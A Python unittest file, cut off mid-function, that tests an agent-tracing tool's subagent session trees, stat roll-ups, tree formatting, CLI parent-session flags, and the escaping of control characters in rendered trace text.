"""Tests for subagent tracing."""

import io
import json
import argparse
import tempfile
import unittest
from unittest.mock import patch

from agent_trace.cli import (
    build_parser,
    cmd_stats,
    _parent_depth,
    _parent_session_id,
    _resolve_parent_session_id,
)
from agent_trace.event_data import NonObjectEventDataError, UnusableTimestampError
from agent_trace.models import EventType, SessionMeta, TraceEvent
from agent_trace.store import TraceStore
from agent_trace import subagent as subagent_mod
from agent_trace.subagent import (
    AggregatedStats,
    SessionNode,
    aggregate_stats,
    build_tree,
    cmd_replay_tree,
    cmd_stats_tree,
    cmd_tree,
    format_tree,
    format_session_tree,
    format_tree_summary,
    in_session_subagents,
    tree_to_dict,
)

try:
    import _escapes
except ImportError:
    from tests import _escapes


def _make_event(event_type: EventType, ts: float, session_id: str, **data) -> TraceEvent:
    return TraceEvent(event_type=event_type, timestamp=ts, session_id=session_id, data=data)


def _make_store_with_sessions(sessions: list[tuple[SessionMeta, list[TraceEvent]]]) -> tuple[TraceStore, tempfile.TemporaryDirectory]:
    tmp = tempfile.TemporaryDirectory()
    store = TraceStore(tmp.name)
    for meta, events in sessions:
        store.create_session(meta)
        for e in events:
            store.append_event(meta.session_id, e)
        store.update_meta(meta)
    return store, tmp


class TestSessionMetaSubagentFields(unittest.TestCase):
    def test_default_values(self):
        meta = SessionMeta(session_id="root1")
        self.assertEqual(meta.parent_session_id, "")
        self.assertEqual(meta.parent_event_id, "")
        self.assertEqual(meta.depth, 0)

    def test_subagent_fields_serialized(self):
        meta = SessionMeta(
            session_id="child1",
            parent_session_id="root1",
            parent_event_id="evt123",
            depth=1,
        )
        json_str = meta.to_json()
        restored = SessionMeta.from_json(json_str)
        self.assertEqual(restored.parent_session_id, "root1")
        self.assertEqual(restored.parent_event_id, "evt123")
        self.assertEqual(restored.depth, 1)

    def test_zero_depth_omitted_from_json(self):
        meta = SessionMeta(session_id="root1")
        d = json.loads(meta.to_json())
        # depth=0 should be omitted (zero value)
        self.assertNotIn("depth", d)

    def test_nonzero_depth_included_in_json(self):
        meta = SessionMeta(session_id="child1", depth=2)
        d = json.loads(meta.to_json())
        self.assertEqual(d["depth"], 2)


class TestBuildTree(unittest.TestCase):
    def _make_tree(self):
        """Create a root session with one child subagent."""
        root_meta = SessionMeta(
            session_id="root0001",
            started_at=0.0,
            tool_calls=5,
            llm_requests=3,
            total_tokens=1000,
            total_duration_ms=5000,
        )
        child_meta = SessionMeta(
            session_id="child001",
            started_at=1.0,
            parent_session_id="root0001",
            parent_event_id="evt_agent",
            depth=1,
            tool_calls=2,
            llm_requests=1,
            total_tokens=400,
            total_duration_ms=2000,
        )

        root_events = [
            _make_event(EventType.USER_PROMPT, 0.0, "root0001", prompt="do something"),
            TraceEvent(event_type=EventType.TOOL_CALL, timestamp=1.0,
                       event_id="evt_agent", session_id="root0001",
                       data={"tool_name": "Agent", "arguments": {"prompt": "subtask"}}),
            _make_event(EventType.SESSION_END, 5.0, "root0001"),
        ]
        child_events = [
            _make_event(EventType.TOOL_CALL, 1.5, "child001",
                        tool_name="Bash", arguments={"command": "ls"}),
            _make_event(EventType.SESSION_END, 3.0, "child001"),
        ]
        store, tmp = _make_store_with_sessions([
            (root_meta, root_events),
            (child_meta, child_events),
        ])
        return store, tmp

    def test_root_has_one_child(self):
        store, tmp = self._make_tree()
        tree = build_tree(store, "root0001")
        self.assertEqual(len(tree.children), 1)
        tmp.cleanup()

    def test_child_session_id(self):
        store, tmp = self._make_tree()
        tree = build_tree(store, "root0001")
        self.assertEqual(tree.children[0].meta.session_id, "child001")
        tmp.cleanup()

    def test_root_has_no_parent(self):
        store, tmp = self._make_tree()
        tree = build_tree(store, "root0001")
        self.assertEqual(tree.meta.parent_session_id, "")
        tmp.cleanup()

    def test_child_depth(self):
        store, tmp = self._make_tree()
        tree = build_tree(store, "root0001")
        self.assertEqual(tree.children[0].depth, 1)
        tmp.cleanup()

    def test_single_session_no_children(self):
        meta = SessionMeta(session_id="solo001", started_at=0.0)
        events = [_make_event(EventType.SESSION_END, 1.0, "solo001")]
        store, tmp = _make_store_with_sessions([(meta, events)])
        tree = build_tree(store, "solo001")
        self.assertEqual(len(tree.children), 0)
        tmp.cleanup()


class TestAggregateStats(unittest.TestCase):
    def test_single_node(self):
        meta = SessionMeta(
            session_id="s1",
            tool_calls=3,
            llm_requests=2,
            errors=1,
            total_tokens=500,
            total_duration_ms=3000,
        )
        node = SessionNode(meta=meta, events=[])
        stats = aggregate_stats(node)
        self.assertEqual(stats.session_count, 1)
        self.assertEqual(stats.tool_calls, 3)
        self.assertEqual(stats.llm_requests, 2)
        self.assertEqual(stats.errors, 1)
        self.assertEqual(stats.total_tokens, 500)

    def test_rolls_up_children(self):
        root_meta = SessionMeta(session_id="r1", tool_calls=5, llm_requests=3,
                                total_tokens=1000, total_duration_ms=5000)
        child_meta = SessionMeta(session_id="c1", tool_calls=2, llm_requests=1,
                                 total_tokens=400, total_duration_ms=2000, depth=1)
        child_node = SessionNode(meta=child_meta, events=[])
        root_node = SessionNode(meta=root_meta, events=[], children=[child_node])

        stats = aggregate_stats(root_node)
        self.assertEqual(stats.session_count, 2)
        self.assertEqual(stats.tool_calls, 7)
        self.assertEqual(stats.llm_requests, 4)
        self.assertEqual(stats.total_tokens, 1400)

    def test_duration_uses_max_not_sum(self):
        root_meta = SessionMeta(session_id="r1", total_duration_ms=5000)
        child_meta = SessionMeta(session_id="c1", total_duration_ms=3000, depth=1)
        child_node = SessionNode(meta=child_meta, events=[])
        root_node = SessionNode(meta=root_meta, events=[], children=[child_node])

        stats = aggregate_stats(root_node)
        # Should be max(5000, 3000) = 5000, not 8000
        self.assertEqual(stats.total_duration_ms, 5000)


class TestFormatTree(unittest.TestCase):
    def _simple_node(self) -> SessionNode:
        meta = SessionMeta(session_id="abc123def456", agent_name="claude-code",
                           started_at=0.0)
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "abc123def456", prompt="hello"),
            _make_event(EventType.TOOL_CALL, 1.0, "abc123def456",
                        tool_name="Bash", arguments={"command": "ls"}),
            _make_event(EventType.SESSION_END, 2.0, "abc123def456"),
        ]
        return SessionNode(meta=meta, events=events)

    def test_output_contains_session_id(self):
        node = self._simple_node()
        buf = io.StringIO()
        format_tree(node, out=buf)
        self.assertIn("abc123def4", buf.getvalue())

    def test_output_contains_tool_call(self):
        node = self._simple_node()
        buf = io.StringIO()
        format_tree(node, out=buf)
        self.assertIn("tool_call", buf.getvalue())
        self.assertIn("Bash", buf.getvalue())

    def test_output_contains_user_prompt(self):
        node = self._simple_node()
        buf = io.StringIO()
        format_tree(node, out=buf)
        self.assertIn("hello", buf.getvalue())

    def test_summary_contains_session_id(self):
        node = self._simple_node()
        buf = io.StringIO()
        format_tree_summary(node, out=buf)
        self.assertIn("abc123def4", buf.getvalue())

    def test_last_child_uses_corner_connector(self):
        """Last child in a multi-child tree should use └─, not ├─."""
        root_meta = SessionMeta(session_id="root0002", started_at=0.0, depth=0)
        child_a = SessionMeta(session_id="childa002", started_at=1.0, depth=1)
        child_b = SessionMeta(session_id="childb002", started_at=2.0, depth=1)
        root_node = SessionNode(
            meta=root_meta,
            events=[],
            children=[
                SessionNode(meta=child_a, events=[]),
                SessionNode(meta=child_b, events=[]),
            ],
        )
        buf = io.StringIO()
        format_tree_summary(root_node, out=buf)
        output = buf.getvalue()
        self.assertIn("└─", output)
        self.assertIn("├─", output)

    def test_expand_false_does_not_inline_subagents(self):
        """format_tree with expand=False should not recurse into children."""
        root_meta = SessionMeta(session_id="root0003", started_at=0.0, depth=0)
        child_meta = SessionMeta(session_id="child003", started_at=1.0, depth=1)
        root_events = [
            TraceEvent(event_type=EventType.TOOL_CALL, timestamp=1.0,
                       event_id="evt_spawn", session_id="root0003",
                       data={"tool_name": "Agent", "arguments": {"prompt": "subtask"}}),
        ]
        child_node = SessionNode(meta=child_meta, events=[
            _make_event(EventType.SESSION_END, 2.0, "child003"),
        ])
        root_node = SessionNode(meta=root_meta, events=root_events,
                                children=[child_node])
        buf = io.StringIO()
        format_tree(root_node, out=buf, expand=False)
        self.assertNotIn("child003", buf.getvalue())


class TestChildrenSharingParentEvent(unittest.TestCase):
    """One tool_call can start more than one child session."""

    def _store(self, child_ids, child_events=None):
        root = "rootshared000000"
        sessions = [(SessionMeta(session_id=root, agent_name="root", started_at=1000.0), [
            TraceEvent(event_type=EventType.TOOL_CALL, timestamp=1001.0, event_id="call1",
                       session_id=root,
                       data={"tool_name": "Bash", "arguments": {"command": "spawn"}}),
            TraceEvent(event_type=EventType.TOOL_RESULT, timestamp=1009.0, event_id="res1",
                       session_id=root, data={"result": "done"}),
        ])]
        for i, sid in enumerate(child_ids):
            meta = SessionMeta(session_id=sid, agent_name="worker", started_at=1002.0 + i,
                               parent_session_id=root, parent_event_id="call1", depth=1)
            events = (child_events or {}).get(sid) or [
                _make_event(EventType.USER_PROMPT, 1002.5 + i, sid, prompt=f"work {sid[:6]}"),
            ]
            sessions.append((meta, events))
        store, tmp = _make_store_with_sessions(sessions)
        self.addCleanup(tmp.cleanup)
        return build_tree(store, root)

    @staticmethod
    def _render(tree):
        buf = io.StringIO()
        format_tree(tree, out=buf)
        return buf.getvalue()

    def test_expand_inlines_every_child_in_start_order(self):
        lines = self._render(self._store(["childA0000000000", "childB0000000000"])).splitlines()
        self.assertEqual(lines[1:7], [
            "+ 1.00s  → tool_call  Bash  $ spawn",
            "├─ ▶ session_start  childA000000  agent=worker  depth=1",
            "├─ + 2.50s  👤 \"work childA\"",
            "",
            "└─ ▶ session_start  childB000000  agent=worker  depth=1",
            "└─ + 3.50s  👤 \"work childB\"",
        ])

    def test_one_child_per_parent_event_renders_as_before(self):
        self.assertEqual(self._render(self._store(["childA0000000000"])), (
            "▶ session_start  rootshared00  agent=root  depth=0\n"
            "+ 1.00s  → tool_call  Bash  $ spawn\n"
            "└─ ▶ session_start  childA000000  agent=worker  depth=1\n"
            "└─ + 2.50s  👤 \"work childA\"\n"
            "\n"
            "+ 9.00s  ← tool_result  done\n"
            "\n"
        ))

    def test_checks_cover_every_child_of_the_event(self):
        bad = "childA0000000000"
        cases = [
            # append_event refuses a NaN timestamp, but it writes a negative one.
            (subagent_mod.require_tree_timestamps, UnusableTimestampError,
             [_make_event(EventType.USER_PROMPT, -1.0, bad, prompt="x")]),
            (subagent_mod.require_tree_event_data, NonObjectEventDataError,
             [TraceEvent(event_type=EventType.USER_PROMPT, timestamp=1002.5,
                         session_id=bad, data=["not", "an", "object"])]),
        ]
        for check, error, events in cases:
            with self.subTest(check=check.__name__):
                tree = self._store([bad, "childB0000000000"], {bad: events})
                with self.assertRaises(error):
                    check(tree)


class TestSessionTreeCommand(unittest.TestCase):
    def _make_tree(self):
        root_meta = SessionMeta(
            session_id="rootcmd1",
            agent_name="orchestrator",
            started_at=0.0,
            tool_calls=3,
            llm_requests=1,
            total_duration_ms=4000,
        )
        child_meta = SessionMeta(
            session_id="childcmd1",
            agent_name="worker",
            started_at=1.0,
            parent_session_id="rootcmd1",
            depth=1,
            tool_calls=2,
            total_duration_ms=1500,
        )
        return _make_store_with_sessions([
            (root_meta, [_make_event(EventType.SESSION_END, 4.0, "rootcmd1")]),
            (child_meta, [_make_event(EventType.SESSION_END, 2.0, "childcmd1")]),
        ])

    def test_tree_to_dict_contains_children(self):
        store, tmp = self._make_tree()
        tree = build_tree(store, "rootcmd1")
        data = tree_to_dict(tree, {"rootcmd1": 0.01, "childcmd1": 0.02})
        self.assertEqual(data["session_id"], "rootcmd1")
        self.assertEqual(data["children"][0]["session_id"], "childcmd1")
        self.assertEqual(data["children"][0]["cost_usd"], 0.02)
        tmp.cleanup()

    def test_format_session_tree_contains_cost_and_child(self):
        store, tmp = self._make_tree()
        tree = build_tree(store, "rootcmd1")
        buf = io.StringIO()
        format_session_tree(tree, costs={"rootcmd1": 0.01, "childcmd1": 0.02}, out=buf)
        output = buf.getvalue()
        self.assertIn("rootcmd1", output)
        self.assertIn("childcmd1", output)
        self.assertIn("$0.0100", output)
        tmp.cleanup()

    def test_cmd_tree_json(self):
        store, tmp = self._make_tree()
        captured = io.StringIO()
        args = argparse.Namespace(
            trace_dir=store.base_dir,
            session_id="root",
            format="json",
        )
        with patch("sys.stdout", captured):
            result = cmd_tree(args)
        self.assertEqual(result, 0)
        data = json.loads(captured.getvalue())
        self.assertEqual(data["total_sessions"], 2)
        self.assertEqual(data["tree"]["children"][0]["session_id"], "childcmd1")
        tmp.cleanup()

    def test_parser_registers_tree_and_parent_flags(self):
        parser = build_parser()
        tree_args = parser.parse_args(["tree", "root", "--format", "json"])
        self.assertEqual(tree_args.command, "tree")
        self.assertEqual(tree_args.session_id, "root")

        record_args = parser.parse_args(["record", "--parent", "root123", "--", "server"])
        self.assertEqual(record_args.parent, "root123")

    def test_parent_session_id_prefers_flag_over_env(self):
        args = argparse.Namespace(parent="from-flag")
        with patch.dict("os.environ", {"AGENT_STRACE_PARENT_SESSION": "from-env"}):
            self.assertEqual(_parent_session_id(args), "from-flag")

    def test_parent_session_id_reads_env(self):
        args = argparse.Namespace(parent=None)
        with patch.dict("os.environ", {"AGENT_STRACE_PARENT_SESSION": "from-env"}):
            self.assertEqual(_parent_session_id(args), "from-env")

    def test_parent_depth_uses_parent_meta(self):
        tmp = tempfile.TemporaryDirectory()
        store = TraceStore(tmp.name)
        store.create_session(SessionMeta(session_id="parent1", depth=2))
        self.assertEqual(_parent_depth(store, "parent1"), 3)
        self.assertEqual(_parent_depth(store, "missing"), 1)
        tmp.cleanup()

    def test_resolve_parent_session_id_expands_prefix(self):
        tmp = tempfile.TemporaryDirectory()
        store = TraceStore(tmp.name)
        store.create_session(SessionMeta(session_id="parent123456"))
        args = argparse.Namespace(parent="parent")
        self.assertEqual(_resolve_parent_session_id(store, args), "parent123456")
        tmp.cleanup()


class TestAggregateStatsDuration(unittest.TestCase):
    def test_child_exceeds_root_duration(self):
        """Child with longer duration than root should set the aggregate."""
        root_meta = SessionMeta(session_id="r1", total_duration_ms=1000)
        child_meta = SessionMeta(session_id="c1", total_duration_ms=5000, depth=1)
        child_node = SessionNode(meta=child_meta, events=[])
        root_node = SessionNode(meta=root_meta, events=[], children=[child_node])
        stats = aggregate_stats(root_node)
        self.assertEqual(stats.total_duration_ms, 5000)

    def test_two_children_takes_max_regardless_of_order(self):
        """Duration should be the max across all children, not dependent on order."""
        root_meta = SessionMeta(session_id="r2", total_duration_ms=2000)
        child_a = SessionNode(meta=SessionMeta(session_id="ca", total_duration_ms=4000, depth=1), events=[])
        child_b = SessionNode(meta=SessionMeta(session_id="cb", total_duration_ms=3000, depth=1), events=[])
        # child_a first (larger), child_b second (smaller)
        root_node = SessionNode(meta=root_meta, events=[], children=[child_a, child_b])
        stats = aggregate_stats(root_node)
        self.assertEqual(stats.total_duration_ms, 4000)

        # Reverse order: child_b first (smaller), child_a second (larger)
        root_node2 = SessionNode(meta=root_meta, events=[], children=[child_b, child_a])
        stats2 = aggregate_stats(root_node2)
        self.assertEqual(stats2.total_duration_ms, 4000)


class TestBuildTreeEdgeCases(unittest.TestCase):
    def test_unknown_session_raises_key_error(self):
        tmp = tempfile.TemporaryDirectory()
        store = TraceStore(tmp.name)
        with self.assertRaises(KeyError):
            build_tree(store, "nonexistent")
        tmp.cleanup()

    def test_max_depth_truncation(self):
        """A chain deeper than MAX_DEPTH should be truncated at MAX_DEPTH."""
        from agent_trace.subagent import MAX_DEPTH
        tmp = tempfile.TemporaryDirectory()
        store = TraceStore(tmp.name)

        # Build a linear chain: root → d1 → d2 → ... → d(MAX_DEPTH+1)
        session_ids = [f"sess{i:04d}" for i in range(MAX_DEPTH + 2)]
        for i, sid in enumerate(session_ids):
            parent_sid = session_ids[i - 1] if i > 0 else ""
            meta = SessionMeta(
                session_id=sid,
                started_at=float(i),
                parent_session_id=parent_sid,
                depth=i,
            )
            store.create_session(meta)
            store.update_meta(meta)

        tree = build_tree(store, session_ids[0])

        # Walk to depth MAX_DEPTH — should exist
        node = tree
        for _ in range(MAX_DEPTH):
            self.assertEqual(len(node.children), 1)
            node = node.children[0]

        # Node at MAX_DEPTH should have no children (truncated)
        self.assertEqual(len(node.children), 0)
        tmp.cleanup()

    def test_child_with_unusable_start_time_sorts_last(self):
        # main raised TypeError comparing "soon" with a float, so tree and
        # export --include-subagents printed a traceback.
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        store = TraceStore(tmp.name)
        store.create_session(SessionMeta(session_id="rootsort", started_at=1.0))
        for sid, started in (("late0001", 3.0), ("early001", 2.0), ("bad00001", 2.5)):
            store.create_session(SessionMeta(session_id=sid, started_at=started, parent_session_id="rootsort"))
        path = store.base_dir / "bad00001" / "meta.json"
        meta = json.loads(path.read_text(encoding="utf-8"))
        meta["started_at"] = "soon"
        path.write_text(json.dumps(meta), encoding="utf-8")

        tree = build_tree(store, "rootsort")

        self.assertEqual([c.meta.session_id for c in tree.children], ["early001", "late0001", "bad00001"])


class TestInSessionSubagentAttribution(unittest.TestCase):
    AGENT = "d0000011-0000-4000-8000-000000000011"
    OTHER = "d0000012-0000-4000-8000-000000000012"
    SID = "s1attr"

    def events(self, attributed=True):
        sub = {"agent_id": self.AGENT, "agent_type": "default"} if attributed else {}
        stop = {"text": "Synthetic   subagent\nanswer."} if attributed else {}

        def ev(event_type, ts, event_id, parent_id="", **data):
            return TraceEvent(event_type=event_type, timestamp=ts, session_id=self.SID,
                              event_id=event_id, parent_id=parent_id, data=data)

        return [
            ev(EventType.SESSION_START, 0.0, "e0", agent_name="codex"),
            ev(EventType.USER_PROMPT, 0.1, "e1", prompt="Spawn one subagent."),
            ev(EventType.TOOL_CALL, 1.0, "c1", tool_name="spawn_agent",
               arguments={"message": "run it"}),
            ev(EventType.TOOL_RESULT, 1.2, "r1", "c1", tool_name="spawn_agent", result="ok"),
            ev(EventType.SUBAGENT_START, 1.3, "e2", provider="codex", **sub),
            ev(EventType.TOOL_CALL, 2.0, "c2", tool_name="Bash",
               arguments={"command": "echo synthetic"}, **sub),
            ev(EventType.TOOL_RESULT, 2.5, "r2", "c2", tool_name="Bash", result="synthetic", **sub),
            ev(EventType.TOOL_CALL, 2.6, "c3", tool_name="Bash", arguments={"command": "false"},
               **sub),
            ev(EventType.ERROR, 2.7, "r3", "c3", tool_name="Bash", error="exit code 1", **sub),
            ev(EventType.SUBAGENT_STOP, 3.0, "e3", provider="codex", **sub, **stop),
            ev(EventType.ASSISTANT_RESPONSE, 4.0, "e4", text="Synthetic final answer."),
            ev(EventType.SESSION_END, 5.0, "e5"),
        ]

    def node(self, attributed=True, children=None):
        meta = SessionMeta(session_id=self.SID, agent_name="codex", started_at=0.0, tool_calls=3)
        return SessionNode(meta=meta, events=self.events(attributed), children=children or [])

    def render(self, formatter, node):
        buf = io.StringIO()
        formatter(node, out=buf)
        return buf.getvalue()

    def test_in_session_subagents_groups_by_agent_id(self):
        events = self.events() + [
            _make_event(EventType.TOOL_CALL, 6.0, self.SID, tool_name="Read",
                        agent_id=self.OTHER),
            _make_event(EventType.TOOL_RESULT, 6.1, self.SID, tool_name="Read",
                        agent_id=self.OTHER),
            _make_event(EventType.TOOL_CALL, 6.2, self.SID, tool_name="Read", agent_id=""),
        ]
        first, second = in_session_subagents(events)
        self.assertEqual(
            (first.agent_id, first.agent_type, first.tool_calls, first.errors),
            (self.AGENT, "default", 2, 1),
        )
        self.assertEqual(
            (second.agent_id, second.agent_type, second.tool_calls, second.errors),
            (self.OTHER, "", 1, 0),
        )
        self.assertEqual(in_session_subagents(self.events(attributed=False)), [])

    def test_format_tree_marks_subagent_events(self):
        lines = self.render(format_tree, self.node()).splitlines()
        tag = "[subagent default 00000011]"
        self.assertIn(f"Bash  {tag}  $ echo synthetic", lines[5])
        self.assertIn(f"tool_result  {tag}  synthetic", lines[6])
        self.assertIn(f"error  {tag}  exit code 1", lines[8])
        self.assertIn("subagent_start  default  agent=00000011", lines[4])
        self.assertIn("subagent_stop  default  agent=00000011", lines[9])
        self.assertEqual(lines[10].strip(), 'returned: "Synthetic subagent answer."')
        self.assertNotIn("[subagent", lines[2] + lines[3])

    def test_format_tree_without_attribution_has_no_marks(self):
        lines = self.render(format_tree, self.node(attributed=False)).splitlines()
        self.assertEqual(lines[4].strip(), "+ 1.30s  ⤷ subagent_start")
        self.assertEqual(lines[9].strip(), "+ 3.00s  ⤶ subagent_stop")
        body = "\n".join(lines[1:])
        for marker in ("[subagent", "agent=", "returned:"):
            self.assertNotIn(marker, body)

    def test_summaries_list_in_session_subagents(self):
        for formatter in (format_tree_summary, format_session_tree):
            with self.subTest(formatter=formatter.__name__):
                lines = self.render(formatter, self.node()).splitlines()
                self.assertEqual(lines[1], "└─ subagent default 00000011  2 tools  ✗ 1 errors")
                plain = self.render(formatter, self.node(attributed=False))
                self.assertNotIn("subagent", plain)
                self.assertEqual(len(plain.splitlines()), 1)

    def test_summary_subagent_line_precedes_child_sessions(self):
        child = SessionNode(
            meta=SessionMeta(session_id="child0001", started_at=1.0, depth=1), events=[]
        )
        lines = self.render(format_tree_summary, self.node(children=[child])).splitlines()
        self.assertEqual(lines[1], "├─ subagent default 00000011  2 tools  ✗ 1 errors")
        self.assertIn("child0001", lines[2])

    def test_tree_to_dict_lists_subagents_only_when_attributed(self):
        data = tree_to_dict(self.node())
        self.assertEqual(data["subagents"], [{
            "agent_id": self.AGENT, "agent_type": "default", "tool_calls": 2, "errors": 1,
        }])
        self.assertNotIn("subagents", tree_to_dict(self.node(attributed=False)))

    def run_stats(self, attributed):
        meta = SessionMeta(session_id=self.SID, agent_name="codex", started_at=1.0)
        store, tmp = _make_store_with_sessions([(meta, self.events(attributed))])
        self.addCleanup(tmp.cleanup)
        out = io.StringIO()
        args = argparse.Namespace(
            trace_dir=store.base_dir, session_id=self.SID, include_subagents=False
        )
        with patch("sys.stdout", out):
            self.assertEqual(cmd_stats(args), 0)
        return out.getvalue()

    def test_stats_lists_subagent_tool_calls(self):
        output = self.run_stats(attributed=True)
        self.assertIn("Subagent Tool Calls:", output)
        self.assertIn(f"    {'default 00000011':<30} {2:>4}x  1 errors", output)

    def test_stats_without_attribution_has_no_subagent_section(self):
        attributed = self.run_stats(attributed=True)
        plain = self.run_stats(attributed=False)
        self.assertNotIn("Subagent", plain)
        start = attributed.index("\n  Subagent Tool Calls:")
        end = attributed.index("\n  Errors (")
        self.assertEqual(attributed[:start] + attributed[end:], plain)


E = EventType
TREE_SESSION = "e5c0000000000001"


def _ev(event_type, **data):
    return _make_event(event_type, 0.0, TREE_SESSION, **data)


def _call(tool_name, arguments, **data):
    return _ev(E.TOOL_CALL, tool_name=tool_name, arguments=arguments, **data)


def _node(*events, **meta):
    meta = SessionMeta(session_id=TREE_SESSION, started_at=0.0, **meta)
    return SessionNode(meta=meta, events=list(events))


def _writes(formatter):
    def render(node):
        buf = io.StringIO()
        formatter(node, out=buf)
        return buf.getvalue()
    return render


# (label, kind, build): build(value) returns a session with value in the place
# the label names. The kinds are in tests/_escapes.py.
FORMAT_TREE_CASES = [
    ("agent_name", "text", lambda v: _node(agent_name=v)),
    ("tool_call tool_name", "text", lambda v: _node(_call(v, {}))),
    ("Bash command", "text", lambda v: _node(_call("Bash", {"command": v}))),
    ("Read file_path", "text", lambda v: _node(_call("Read", {"file_path": v}))),
    ("Write file_path", "text", lambda v: _node(_call("Write", {"file_path": v}))),
    ("Edit file_path", "text", lambda v: _node(_call("Edit", {"file_path": v}))),
    ("Agent prompt", "free", lambda v: _node(_call("Agent", {"prompt": v}))),
    ("Task prompt", "free", lambda v: _node(_call("Task", {"prompt": v}))),
    ("subagent_type", "text",
     lambda v: _node(_call("Task", {"prompt": "plain"}, subagent_type=v))),
    ("tool_call agent_type", "text",
     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id="plain", agent_type=v))),
    ("tool_call agent_id", "short",
     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id=v))),
    ("tool_result result", "free", lambda v: _node(_ev(E.TOOL_RESULT, result=v))),
    ("tool_result content_preview", "free",
     lambda v: _node(_ev(E.TOOL_RESULT, content_preview=v))),
    ("tool_result agent_type", "text",
     lambda v: _node(_ev(E.TOOL_RESULT, result="plain", agent_id="plain", agent_type=v))),
    ("tool_result agent_id", "short",
     lambda v: _node(_ev(E.TOOL_RESULT, result="plain", agent_id=v))),
    ("error message", "free", lambda v: _node(_ev(E.ERROR, message=v))),
    ("error error", "free", lambda v: _node(_ev(E.ERROR, error=v))),
    ("error agent_type", "text",
     lambda v: _node(_ev(E.ERROR, message="plain", agent_id="plain", agent_type=v))),
    ("error agent_id", "short", lambda v: _node(_ev(E.ERROR, message="plain", agent_id=v))),
    ("user_prompt prompt", "free", lambda v: _node(_ev(E.USER_PROMPT, prompt=v))),
    ("assistant_response text", "free", lambda v: _node(_ev(E.ASSISTANT_RESPONSE, text=v))),
    ("subagent_start agent_type", "text",
     lambda v: _node(_ev(E.SUBAGENT_START, agent_type=v, child_session_id="plain",
                         agent_id="plain"))),
    ("subagent_start agent_name", "text",
     lambda v: _node(_ev(E.SUBAGENT_START, agent_name=v, child_session_id="plain"))),
    ("subagent_start child_session_id", "short",
     lambda v: _node(_ev(E.SUBAGENT_START, agent_type="plain", child_session_id=v,
                         agent_id="plain"))),
    ("subagent_start agent_id", "short",
     lambda v: _node(_ev(E.SUBAGENT_START, agent_type="plain", child_session_id="plain",
                         agent_id=v))),
    ("subagent_stop text", "free",
     lambda v: _node(_ev(E.SUBAGENT_STOP, agent_type="plain", text=v))),
]

# Values that format_tree_summary and format_session_tree both print.
_SUMMARY_CASES = [
    ("subagent agent_type", "text",
     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id="plain", agent_type=v))),
    ("subagent agent_id", "short",
     lambda v: _node(_call("Bash", {"command": "plain"}, agent_id=v))),
]
FORMAT_TREE_SUMMARY_CASES = _SUMMARY_CASES
FORMAT_SESSION_TREE_CASES = _SUMMARY_CASES + [
    ("agent_name", "text", lambda v: _node(agent_name=v)),
    ("command", "text", lambda v: _node(command=v)),
]

# (label, cut, build): the formatter keeps cut characters of the value the
# label names, the last ones for an agent ID.
FORMAT_TREE_CUTS = [
    ("Bash command", 80, lambda v: _node(_call("Bash", {"command": v}))),
    ("Agent prompt", 60, lambda v: _node(_call("Agent", {"prompt": v}))),
    ("Task prompt", 60, lambda v: _node(_call("Task", {"prompt": v}))),
    ("tool_call agent_id", 8, lambda v: _node(_call("Bash", {"command": "plain"}, agent_id=v))),
    ("tool_result result", 80, lambda v: _node(_ev(E.TOOL_RESULT, result=v))),
    ("tool_result content_preview", 80, lambda v: _node(_ev(E.TOOL_RESULT, content_preview=v))),
    ("tool_result agent_id", 8, lambda v: _node(_ev(E.TOOL_RESULT, result="plain", agent_id=v))),
    ("error message", 80, lambda v: _node(_ev(E.ERROR, message=v))),
    ("error error", 80, lambda v: _node(_ev(E.ERROR, error=v))),
    ("error agent_id", 8, lambda v: _node(_ev(E.ERROR, message="plain", agent_id=v))),
    ("user_prompt prompt", 80, lambda v: _node(_ev(E.USER_PROMPT, prompt=v))),
    ("assistant_response text", 80, lambda v: _node(_ev(E.ASSISTANT_RESPONSE, text=v))),
    ("subagent_start child_session_id", 12,
     lambda v: _node(_ev(E.SUBAGENT_START, agent_type="plain", child_session_id=v,
                         agent_id="plain"))),
    ("subagent_start agent_id", 8,
     lambda v: _node(_ev(E.SUBAGENT_START, agent_type="plain", child_session_id="plain",
                         agent_id=v))),
    ("subagent_stop text", 80, lambda v: _node(_ev(E.SUBAGENT_STOP, agent_type="plain", text=v))),
]
FORMAT_TREE_SUMMARY_CUTS = [
    ("subagent agent_id", 8, lambda v: _node(_call("Bash", {"command": "plain"}, agent_id=v))),
]
FORMAT_SESSION_TREE_CUTS = FORMAT_TREE_SUMMARY_CUTS + [
    ("agent_name", 28, lambda v: _node(agent_name=v)),
    ("command", 28, lambda v: _node(command=v)),
]


class TestTraceTextShowsAsText(unittest.TestCase):
    """A command, a prompt or an agent name in a trace can hold escape codes
    and line breaks. The tree views show them as text."""

    FORMATTERS = [
        ("format_tree", FORMAT_TREE_CASES, _writes(format_tree)),
        ("format_tree_summary", FORMAT_TREE_SUMMARY_CASES, _writes(format_tree_summary)),
        ("format_session_tree", FORMAT_SESSION_TREE_CASES, _writes(format_session_tree)),
    ]
    CUTS = [
        ("format_tree", FORMAT_TREE_CUTS, _writes(format_tree)),
        ("format_tree_summary", FORMAT_TREE_SUMMARY_CUTS, _writes(format_tree_summary)),
        ("format_session_tree", FORMAT_SESSION_TREE_CUTS, _writes(format_session_tree)),
    ]

    def test_each_value_shows_escapes_as_text(self):
        for name, cases, render in self.FORMATTERS:
            with self.subTest(name):
                _escapes.check_each_value(self, cases, render)

    def test_plain_text_prints_unchanged(self):
        for name, cases, render in self.FORMATTERS:
            with self.subTest(name):
                _escapes.check_plain_text_unchanged(self, cases, render)

    def test_count_that_is_not_a_count_reads_as_zero(self):
        # meta.json can hold text where a count belongs. The tree views and
        # the totals show it as 0, as a missing count, so no text reaches
        # the output.
        store, tmp = _make_store_with_sessions([(SessionMeta(session_id=TREE_SESSION), [])])
        self.addCleanup(tmp.cleanup)
        handlers = [
            ("replay --tree", cmd_replay_tree,
             dict(session_id=TREE_SESSION, tree=True, tree_only=False)),
            ("stats --include-subagents", cmd_stats_tree, dict(session_id=TREE_SESSION)),
            ("tree", cmd_tree, dict(session_id=TREE_SESSION, format="text")),
        ]

        def run(handler, kwargs, node):
            # The formatters write to the sys.stdout bound at import, and
            # their output is checked on its own.
            with patch.object(subagent_mod, "build_tree", return_value=node), \
                 patch.object(subagent_mod, "format_tree_summary"), \
                 patch.object(subagent_mod, "format_session_tree"), \
                 patch("sys.stdout", new_callable=io.StringIO) as out:
